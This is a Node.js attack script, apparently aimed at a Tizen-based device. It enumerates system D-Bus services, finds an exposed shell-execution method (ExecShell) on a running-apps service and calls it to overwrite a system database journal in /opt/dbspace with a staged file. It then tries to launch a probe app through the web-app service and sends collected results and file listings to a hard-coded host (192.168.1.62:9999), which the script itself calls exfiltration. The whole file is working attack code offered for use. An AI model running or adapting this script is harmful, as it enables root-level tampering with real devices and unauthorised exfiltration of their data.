"use strict";

/* p62: RAS ExecShell root placement + was Launch fallback
   A1. RAS raw introspect via dbus-send (busctl failed on XML) -> methods+args
   A2. DBus ListNames (find litewebappservice well-known name + appctxmgr)
   B.  call RAS exec method (ExecShell > /exec/i > /shell|cmd/i)
       cmd: sh -c "cp staged -> /opt/dbspace/.app-context.db-journal && md5sum && ls"
   C.  was: ListNames -> introspect Introspectable chain -> Launch ProbeAppio.Probe7
   D.  wait 90s (Probe7 p71 flow if launched)
   E.  verify: DST md5 (oracle 03683f81), LIVE md5, staged md5, /opt/dbspace ls
   exfil /p62info
 */

var fs = null, cp = null, net = null;
try { fs = require('fs'); } catch (e) {}
try { cp = require('child_process'); } catch (e) {}
try { net = require('net'); } catch (e) {}

var HOST = '192.168.1.62';
var PORT = 9999;
var STAGED = '/home/owner/share/tmp/sdk_tools/appctx_hot_journal';
var DST = '/opt/dbspace/.app-context.db-journal';
var LIVE = '/opt/dbspace/.app-context.db';
var RAS = 'com.native.RunningAppsServiceDBUS';
var RAS_PATH = '/com/native/RunningAppsServiceDBUS';
var R = { ts: new Date().toISOString(), probe: 'p62', results: {}, log: [] };
var posted = false;

function L(s) { R.log.push(String(s).substring(0, 500)); }

function postBuf(path, buf) {
  var hdr = 'POST ' + path + ' HTTP/1.1\r\nHost: ' + HOST + ':9999\r\nContent-Type: application/octet-stream\r\nContent-Length: ' + buf.length + '\r\nConnection: close\r\n\r\n';
  try {
    var s = net.connect(PORT, HOST);
    s.setTimeout(120000, function () { s.destroy(); });
    s.on('connect', function () {
      s.write(hdr);
      var off = 0;
      var iv = setInterval(function () {
        if (off >= buf.length) { clearInterval(iv); setTimeout(function () { s.destroy(); }, 3000); return; }
        s.write(buf.slice(off, off + 65536));
        off += 65536;
      }, 50);
      setTimeout(function () { s.destroy(); }, 240000);
    });
    s.on('error', function (e) { L('postBuf err ' + e.message); });
  } catch (e) { L('postBuf ctor ' + e); }
}

function postFinal() {
  if (posted) return;
  posted = true;
  postBuf('/p62info', new Buffer(JSON.stringify(R), 'utf8'));
}

function run(cmd, timeoutMs, maxLen) {
  maxLen = maxLen || 8000;
  try {
    var out = cp.execSync(cmd, { timeout: timeoutMs || 25000, maxBuffer: 16 * 1024 * 1024 }).toString().trim();
    return '[exit 0] ' + out.substring(0, maxLen);
  } catch (e) {
    var o = '';
    if (e.stdout) o += e.stdout.toString();
    if (e.stderr) o += (o ? '\n' : '') + e.stderr.toString();
    return '[exit ' + (e.status === undefined ? '?' : e.status) + '] ' + (o || (e && e.message) || 'unknown').substring(0, maxLen);
  }
}

/* parse raw DBus introspection XML: { iface: [ {name, args:[types]} ] } */
function parseDbusXml(text) {
  var ifaces = {};
  var ire = /<interface name=['"]([^'"]+)['"]>/g;
  var mi;
  while ((mi = ire.exec(String(text))) !== null) {
    var ifname = mi[1];
    var ifaces2 = ifaces[ifname] || [];
    var body = String(text).substring(mi.index);
    var end = body.indexOf('</interface>');
    if (end > 0) body = body.substring(0, end);
    var mre = /<method name=['"]([^'"]+)['"]>([\s\S]*?)<\/method>/g;
    var mm;
    while ((mm = mre.exec(body)) !== null) {
      var args = [];
      var are = /<arg[^>]*type=['"]([^'"]+)['"][^>]*>/g;
      var am;
      while ((am = are.exec(mm[2])) !== null) args.push(am[1]);
      ifaces2.push({ name: mm[1], args: args });
    }
    ifaces[ifname] = ifaces2;
  }
  return ifaces;
}

function pickExec(ifaces) {
  var keys = Object.keys(ifaces);
  function find(re, exactName) {
    for (var i = 0; i < keys.length; i++) {
      var ms = ifaces[keys[i]];
      for (var j = 0; j < ms.length; j++) {
        if (ms[j].args.length > 0 && ms[j].args[0] === 's' && (exactName ? ms[j].name === exactName : re.test(ms[j].name))) {
          return { iface: keys[i], m: ms[j] };
        }
      }
    }
    return null;
  }
  return find(null, 'ExecShell') || find(/exec/i) || find(/shell|run|cmd/i);
}

function listNodes(dest) {
  var out = run('dbus-send --system --print-reply --dest=' + dest + ' / org.freedesktop.DBus.Introspectable.Introspect 2>&1 | head -40', 30000);
  var nodes = [];
  var re = /node name=['"]([^'"]+)['"]/g;
  var m;
  while ((m = re.exec(out)) !== null) nodes.push(m[1]);
  return { out: out, nodes: nodes };
}

function main() {
  /* ---------- A. discovery ---------- */
  R.results.a1_ras_xml = run('dbus-send --system --print-reply --dest=' + RAS + ' ' + RAS_PATH + ' org.freedesktop.DBus.Introspectable.Introspect 2>&1 | head -120', 45000, 12000);
  R.results.a2_listnames = run('dbus-send --system --print-reply --dest=org.freedesktop.DBus /org/freedesktop/DBus org.freedesktop.DBus.ListNames 2>&1 | head -80', 45000, 12000);

  /* ---------- B. RAS exec ---------- */
  var rasIfaces = parseDbusXml(R.results.a1_ras_xml);
  R.results.b0_ras_methods = JSON.stringify(rasIfaces);
  var execM = pickExec(rasIfaces);
  if (execM) {
    var inner = 'cp ' + STAGED + ' ' + DST + ' && md5sum ' + DST + ' && ls -la ' + DST;
    var cmd = 'sh -c ' + inner;
    var args = 'string:"' + cmd + '"';
    var extra = execM.m.args.length > 1 ? execM.m.args.slice(1).map(function (t) { return t === 's' ? 'string:""' : 'int32:0'; }).join(' ') : '';
    if (extra) args += ' ' + extra;
    R.results.b1_exec_call = 'iface=' + execM.iface + ' method=' + execM.m.name + ' args=' + JSON.stringify(execM.m.args);
    R.results.b1_exec_out = run('dbus-send --system --print-reply --dest=' + RAS + ' --type=method_call --path=' + RAS_PATH + ' ' + execM.iface + '.' + execM.m.name + ' ' + args + ' 2>&1 | head -40', 60000);
  } else {
    R.results.b1_exec_call = 'no exec method found in raw XML';
    R.results.b1_exec_out = 'skipped';
  }

  /* ---------- C. was launch ---------- */
  var ln = R.results.a2_listnames;
  var webappNames = [];
  var lnLines = ln.split('\n');
  for (var i = 0; i < lnLines.length; i++) {
    var t = lnLines[i].trim().replace(/["']/g, '');
    if (t.indexOf('webapp') >= 0 && t.indexOf('org') >= 0 && webappNames.indexOf(t) < 0) webappNames.push(t);
  }
  if (webappNames.length === 0) {
    var t2 = ln.replace(/["']/g, '').split(/\s+/);
    for (var j = 0; j < t2.length; j++) {
      if (t2[j].indexOf('webapp') >= 0 && t2[j].indexOf('.') >= 0) webappNames.push(t2[j]);
    }
  }
  R.results.c0_webapp_names = JSON.stringify(webappNames);

  var wasDone = [];
  for (var w = 0; w < webappNames.length && wasDone.length < 4; w++) {
    var wn = webappNames[w];
    var nodes = listNodes(wn);
    wasDone.push(wn + ': nodes=' + JSON.stringify(nodes.nodes));
    var launchFound = null;
    var pathsToTry = nodes.nodes.length > 0 ? nodes.nodes.slice(0, 3) : ['org/tizen/webappservice', 'org/tizen/was', ''];
    for (var p = 0; p < pathsToTry.length && !launchFound; p++) {
      var pp = pathsToTry[p];
      var intro = run('dbus-send --system --print-reply --dest=' + wn + ' /' + pp + ' org.freedesktop.DBus.Introspectable.Introspect 2>&1 | head -80', 30000, 8000);
      var ifs = parseDbusXml(intro);
      var lkeys = Object.keys(ifs);
      for (var q = 0; q < lkeys.length && !launchFound; q++) {
        var ms2 = ifs[lkeys[q]];
        for (var k = 0; k < ms2.length; k++) {
          var nm = ms2[k].name;
          if (ms2[k].args.length > 0 && ms2[k].args[0] === 's' && (/^launch/i.test(nm) || /^activate/i.test(nm) || /^execute/i.test(nm))) {
            launchFound = { iface: lkeys[q], m: ms2[k] };
          }
        }
      }
      if (launchFound) launchFound.path = '/' + pp;
    }
    if (launchFound) {
      var largs = 'string:"ProbeAppio.Probe7"';
      var lextra = launchFound.m.args.length > 1 ? launchFound.m.args.slice(1).map(function (t) { return t === 's' ? 'string:""' : 'int32:0'; }).join(' ') : '';
      if (lextra) largs += ' ' + lextra;
      R.results['c1_launch_call_' + wn] = 'path=' + launchFound.path + ' iface=' + launchFound.iface + ' method=' + launchFound.m.name + ' args=' + JSON.stringify(launchFound.m.args);
      R.results['c1_launch_out_' + wn] = run('dbus-send --system --print-reply --dest=' + wn + ' --type=method_call --path=' + launchFound.path + ' ' + launchFound.iface + '.' + launchFound.m.name + ' ' + largs + ' 2>&1 | head -30', 45000);
    } else {
      wasDone.push(wn + ': no launch-like method');
    }
  }
  R.results.c2_was_done = wasDone.join(' || ');

  /* ---------- D. wait (Probe7 p71 flow if launched) ---------- */
  try { cp.execSync('sleep 90', { timeout: 110000, maxBuffer: 4096 }); } catch (e) {}

  /* ---------- E. verify ---------- */
  R.results.e1_verify = run('echo ===DST; ls -la ' + DST + ' 2>&1; md5sum ' + DST + ' 2>&1; echo ===LIVE; md5sum ' + LIVE + ' 2>&1; echo ===STAGED; md5sum ' + STAGED + ' 2>&1; echo ===DBSPACE; ls -la /opt/dbspace/ 2>&1 | head -25', 30000);

  R.results.final = 'done ' + new Date().toISOString();
  L('done');
  postFinal();
  setTimeout(postFinal, 20000);
}

try { main(); } catch (e) { R.results.fatal = String(e) + ' | ' + (e.stack || 'no-stack'); postFinal(); }
